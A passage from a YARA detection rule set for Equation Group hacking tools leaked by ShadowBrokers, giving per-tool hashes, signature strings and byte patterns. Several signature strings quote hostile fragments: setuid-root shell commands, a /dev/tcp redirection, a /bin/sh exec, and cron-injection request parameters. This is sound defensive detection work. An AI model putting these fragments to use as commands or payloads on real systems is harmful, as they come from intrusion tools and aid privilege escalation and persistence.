      $x3 = "-g  - Subset of -m that Green Spirit hits " fullword ascii
      $x4 = "--- ewok version" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 80KB and 1 of them )
}

rule EquationGroup_xspy {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file xspy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf"
   strings:
      $s1 = "USAGE: xspy -display <display> -delay <usecs> -up" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_estesfox {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estesfox"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a"
   strings:
      $x1 = "chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron" fullword ascii
   condition:
      all of them
}

rule EquationGroup_elatedmonkey_1_0_1_1 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elatedmonkey.1.0.1.1.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "bf7a9dce326604f0681ca9f7f1c24524543b5be8b6fcc1ba427b18e2a4ff9090"
   strings:
      $x3 = "Usage: $0 ( -s IP PORT | CMD )" fullword ascii
      $s5 = "os.execl(\"/bin/sh\", \"/bin/sh\", \"-c\", \"$CMD\")" fullword ascii
      $s13 = "PHP_SCRIPT=\"$HOME/public_html/info$X.php\"" fullword ascii
      $s15 = "cat > /dev/tcp/127.0.0.1/80 <<END" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 5KB and ( 1 of ($x*) and 5 of ($s*) ) ) or ( all of them )
}

rule EquationGroup_scanner {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scanner"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
   strings:
      $x1 = "program version netid     address             service         owner" fullword ascii
      $x4 = "*** Sorry about the raw output, I'll leave it for now" fullword ascii
      $x5 = "-scan winn %s one" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

/* Super Rules ------------------------------------------------------------- */

rule EquationGroup__ftshell_ftshell_v3_10_3_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
      hash2 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
   strings:
      $s1 = "set uRemoteUploadCommand \"[exec cat /current/.ourtn-ftshell-upcommand]\"" fullword ascii
      $s2 = "send \"\\[ \\\"\\$BASH\\\" = \\\"/bin/bash\\\" -o \\\"\\$SHELL\\\" = \\\"/bin/bash\\\" \\] &&" ascii
      $s3 = "system rm -f /current/tmp/ftshell.latest" fullword ascii
      $s4 = "# ftshell -- File Transfer Shell" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 100KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__scanner_scanner_v2_1_2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
      hash2 = "9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff"
   strings:
      $s1 = "Welcome to the network scanning tool" fullword ascii
      $s2 = "Scanning port %d" fullword ascii
      $s3 = "/current/down/cmdout/scans" fullword ascii
      $s4 = "Scan for SSH version" fullword ascii
      $s5 = "program vers proto   port  service" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__ghost_sparc_ghost_x86_3 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1"
      hash2 = "82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33"
   strings:
      $x1 = "Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target" fullword ascii
      $x2 = "Sending shellcode as part of an open command..." fullword ascii
      $x3 = "cmdshellcode" fullword ascii
      $x4 = "You will not be able to run the shellcode. Exiting..." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      hash2 = "ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd"
   strings:
      $s1 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
      $s2 = "e.g.: -n 1-1024,1080,6666,31337 " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and all of them )
}

rule EquationGroup__jparsescan_parsescan_5 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
      hash2 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
   strings:
      $s1 = "# default is to dump out all scanned hosts found" fullword ascii
      $s2 = "$bool .= \" -r \" if (/mibiisa.* -r/);" fullword ascii
      $s3 = "sadmind is available on two ports, this also works)" fullword ascii
      $s4 = "-x IP      gives \\\"hostname:# users:load ...\\\" if positive xwin scan" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__funnelout_v4_1_0_1 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash2 = "457ed14e806fdbda91c4237c8dc058c55e5678f1eecdd78572eff6ca0ed86d33"
   strings:
      $s1 = "header(\"Set-Cookie: bbsessionhash=\" . \\$hash . \"; path=/; HttpOnly\");" fullword ascii
      $s2 = "if ($code =~ /proxyhost/) {" fullword ascii
      $s3 = "\\$rk[1] = \\$rk[1] - 1;" fullword ascii
      $s4 = "#existsUser($u) or die \"User '$u' does not exist in database.\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__magicjack_v1_1_0_0_client {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
   strings:
      $s1 = "temp = ((left >> 1) ^ right) & 0x55555555" fullword ascii
      $s2 = "right ^= (temp <<  16) & 0xffffffff" fullword ascii
      $s3 = "tempresult = \"\"" fullword ascii
      $s4 = "num = self.bytes2long(data)" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )
}

rule EquationGroup__ftshell {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      super_rule = 1
      hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
      hash4 = "0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951"
   strings:
      $s1 = "if { [string length $uRemoteUploadCommand]" fullword ascii
      $s2 = "processUpload" fullword ascii
      $s3 = "global dothisreallyquiet" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-09
   Identifier: Equation Group hack tools leaked by ShadowBrokers
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_store_linux_i386_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc"
   strings:
      $s1 = "[-] Failed to map file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "[!] Name has size of 0!" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_morerats_client_genkey {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89"
   strings:
      $x1 = "rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')" fullword ascii
      $x2 = "client_auth = binascii.hexlify(lo_execute('openssl rand 16'))" fullword ascii
   condition:
      ( filesize < 3KB and all of them )
}

rule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61"
   strings:
      $s1 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s2 = "0123456789abcdefABCEDF:" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_cursesleepy_mswin32_v_1_0_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352"
   strings:
      $s1 = "A}%j,R" fullword ascii
      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } /* Opcode */
      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule EquationGroup_porkserver_v3_0_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "7b5f86e289047dd673e8a09438d49ec43832b561bac39b95098f5bf4095b8b4a"
   strings:
      $s1 = "%s: %s rpcprog=%d, rpcvers = %d/%d, proto=%s, wait.max=%d.%d, user.group=%s.%s builtin=%lx server=%s" fullword ascii
      $s2 = "%s/%s server failing (looping), service terminated" fullword ascii
      $s3 = "getpwnam: %s: No such user" fullword ascii
      $s4 = "execv %s: %m" fullword ascii
      $s5 = "%s/%s: getsockname: %m" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 70KB and 4 of them )
}

rule EquationGroup_cursehelper_win2k_i686_v_2_2_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "5ac6fde8a06f4ade10d672e60e92ffbf78c4e8db6b5152e23171f6f53af0bfe1"
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}" fullword ascii

      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } /* Opcode */
      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and all of them )
}

rule EquationGroup_morerats_client_addkey {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6c67c03716d06a99f20c1044585d6bde7df43fee89f38915db0b03a42a3a9f4b"
   strings:
      $x1 = "print '  -s storebin  use storebin as the Store executable\\n'" fullword ascii
      $x2 = "os.system('%s --file=\"%s\" --wipe > /dev/null' % (storebin, b))" fullword ascii
      $x3 = "print '  -k keyfile   the key text file to inject'" fullword ascii
   condition:
      ( filesize < 20KB and 1 of them )
}

rule EquationGroup_noclient_3_3_2 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "3cf0eb010c431372af5f32e2ee8c757831215f8836cabc7d805572bb5574fc72"
   strings:
      $x1 = "127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning" fullword ascii
      $x2 = "iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;" fullword ascii
      $x3 = "noclient: failed to execute %s: %s" fullword ascii
      $x4 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
      $s5 = "Attempting connection from 0.0.0.0:" ascii
   condition:
      ( filesize < 1000KB and 1 of them )
}

rule EquationGroup_curseflower_mswin32_v_1_0_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "fdc452629ff7befe02adea3a135c3744d8585af890a4301b2a10a817e48c5cbf"
   strings:
      $s1 = "<pVt,<et(<st$<ct$<nt" fullword ascii

      $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_tmpwatch {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "65ed8066a3a240ee2e7556da74933a9b25c5109ffad893c21a626ea1b686d7c1"
   strings:
      $s1 = "chown root:root /tmp/.scsi/dev/bin/gsh" fullword ascii
      $s2 = "chmod 4777 /tmp/.scsi/dev/bin/gsh" fullword ascii
   condition:
      ( filesize < 1KB and 1 of them )
}

rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff"
   strings:
      $s1 = "_lib_version" fullword ascii
      $s2 = ",%02d%03d" fullword ascii
      $s3 = "TRANSIT" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_morerats_client_noprep {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "a5b191a8ede8297c5bba790ef95201c516d64e2898efaeb44183f8fdfad578bb"
   strings:
      $x1 = "storestr = 'echo -n \"%s\" | Store --nullterminate --file=\"%s\" --set=\"%s\"' % (nopenargs, outfile, VAR_NAME)" fullword ascii
      $x2 = "The NOPEN-args provided are injected into infile if it is a valid" fullword ascii
      $x3 = " -i                do not autokill after 5 hours" fullword ascii
   condition:
      ( filesize < 9KB and 1 of them )
}

rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135"
   strings:
      $s1 = ",%02d%03d" fullword ascii
      $s2 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s3 = "__strtoll_internal" fullword ascii
      $s4 = "__strtoul_internal" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and all of them )
}

rule EquationGroup_seconddate_ImplantStandalone_3_0_3 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511"
   strings:
      $s1 = "EFDGHIJKLMNOPQRSUT" fullword ascii
      $s2 = "G8HcJ HcF LcF0LcN" fullword ascii
      $s3 = "GhHcJ0HcF@LcF0LcN8H" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and all of them )
}

rule EquationGroup_watcher_solaris_i386_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "395ec2531970950ffafde234dded0cce0c95f1f9a22763d1d04caa060a5222bb"
   strings:
      $s1 = "getexecname" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s6 = "__fpstart" fullword ascii
      $s12 = "GHFIJKLMNOPQRSTUVXW" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and all of them )
}

rule EquationGroup_gr_dev_bin_now {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "f5ed8312fc6e624b04e1e2d6614f3c651c9e9902ff41f4d069c32caca0869fa4"
   strings:
      $x1 = "HTTP_REFERER=\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\"" fullword ascii
      $x2 = "exec /usr/share/redmin/cgi/redmin" fullword ascii
   condition:
      ( filesize < 1KB and 1 of them )
}

rule EquationGroup_gr_dev_bin_post {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "c1546155efa95dbc4e3cc95299a3968fc075f89d33164e78b00b76c7d08a0591"
   strings:
      $x1 = "op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005" ascii
   condition:
      ( filesize < 1KB and all of them )
}

rule EquationGroup_curseyo_win2k_v_1_0_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "5dc77614764b23a38610fdd8abe5b2274222f206889e4b0974a3fea569055ed6"
   strings:
      $s1 = "0123456789abcdefABCEDF:" fullword ascii

      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } /* Opcode */
      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } /* Opcode */
      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_gr {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "d3cd725affd31fa7f0e2595f4d76b09629918612ef0d0307bb85ade1c3985262"
   strings:
      $s1 = "if [ -f /tmp/tmpwatch ] ; then" fullword ascii
      $s2 = "echo \"bailing. try a different name\"" fullword ascii
   condition:
      ( filesize < 1KB and all of them )
}

rule EquationGroup_curseroot_win2k_v_2_1_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "a1637948ed6ebbd2e582eb99df0c06b27a77c01ad1779b3d84c65953ca2cb603"
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } /* Opcode */
      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } /* Opcode */
      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and $s1 and 2 of ($op*) )
}

rule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "aff27115ac705859871ab1bf14137322d1722f63705d6aeada43d18966843225"
      hash2 = "7a25e26950bac51ca8d37cec945eb9c38a55fa9a53bc96da53b74378fb10b67e"
   strings:
      $s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
      $s3 = ",%02d%03d" fullword ascii
      $s4 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii

      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } /* Opcode */
      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } /* Opcode */
      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )
}

rule EquationGroup_watcher_linux_i386_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8"
   strings:
      $s1 = "invalid option `" fullword ascii
      $s8 = "readdir64" fullword ascii
      $s9 = "89:z89:%r%opw" fullword wide
      $s13 = "Ropopoprstuvwypypop" fullword wide
      $s17 = "Missing argument for `-x'." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and all of them )
}

rule EquationGroup_charm_saver_win2k_v_2_0_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "0f7936a37482532a8ba5df4112643ed7579dd0e59181bfca9c641b9ba0a9912f"
   strings:
      $s2 = "0123456789abcdefABCEDF:" fullword ascii

      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } /* Opcode */
      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_cursehappy_win2k_v_6_1_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "eb669afd246a7ac4de79724abcce5bda38117b3138908b90cac58936520ea632"
   strings:
      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } /* Opcode */
      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}

rule EquationGroup_morerats_client_Store {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465"
   strings:
      $s1 = "[-] Failed to mmap file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "Missing argument for `-x'." fullword ascii
      $s4 = "[!] Value has size of 0!" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and 2 of them )
}

rule EquationGroup_watcher_linux_x86_64_v_3_3_0 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      hash1 = "a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3"
   strings:
      $s1 = "forceprismheader" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s3 = "forceprism" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and all of them )
}

rule EquationGroup_linux_exactchange {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      super_rule = 1
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      hash3 = "39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b"
      hash4 = "15e12c1c27304e4a68a268e392be4972f7c6edf3d4d387e5b7d2ed77a5b43c2c"
   strings:
      $x1 = "[+] looking for vulnerable socket" fullword ascii
      $x2 = "can't use 32-bit exploit on 64-bit target" fullword ascii
      $x3 = "[+] %s socket ready, exploiting..." fullword ascii
      $x4 = "[!] nothing looks vulnerable, trying everything" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_x86_linux_exactchange {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09"
      super_rule = 1
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
   strings:
      $x1 = "kernel has 4G/4G split, not exploitable" fullword ascii
      $x2 = "[+] kernel stack size is %d" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and 1 of them )
}
